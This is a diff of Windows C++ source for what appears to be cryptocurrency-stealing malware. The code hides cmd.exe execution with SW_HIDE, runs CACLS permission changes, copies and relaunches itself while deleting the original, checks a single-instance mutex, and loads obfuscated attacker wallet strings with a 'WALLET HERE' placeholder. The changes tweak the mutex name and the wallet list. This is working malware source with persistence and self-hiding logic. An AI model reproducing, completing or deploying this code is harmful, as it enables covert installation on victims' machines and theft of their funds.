@@ -104,10 +104,11 @@ int Copy(TCHAR* CopyPth, TCHAR* CruPath, TCHAR* Username) {
 	ShellExecuteW(0, L"open", L"cmd.exe", CACLS2, 0, SW_HIDE); // End protect, lazy to comment this shit method ;-)
 	CreateProcess(NULL, CopyPth, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	Delete(CruPath);
+	return 0;
 }
 
 int CheckMutex() {
-	WCHAR MUTEX[] = { L"T", L"r", L"u", L"m", L"M", L"a", L"k", L"e", L"A", L"m", L"e", L"r", L"i", L"c", L"a", L"G", L"r", L"e", L"a", L"t"};
+	WCHAR MUTEX[] = { L"T"};
 	HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
 	if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED)) {
 		CloseHandle(hMutex);
@@ -203,8 +204,8 @@ int main() {
 	char *mkwei3 = new char[mov_eax_push_5012("WALLET HERE").length() + 1];
 	strcpy(mkwei3, mov_eax_push_5012("WALLET HERE").c_str());
 
-	static char * dreams[] = { frst, scnd, urejds, mkdjd, mkwei3 };
-	App FUcker(5, dreams);
+	static char * dreams[] = { scnd, urejds, mkdjd, mkwei3 };
+	App FUcker(4, dreams);
 
 	return FUcker.exec();
 }
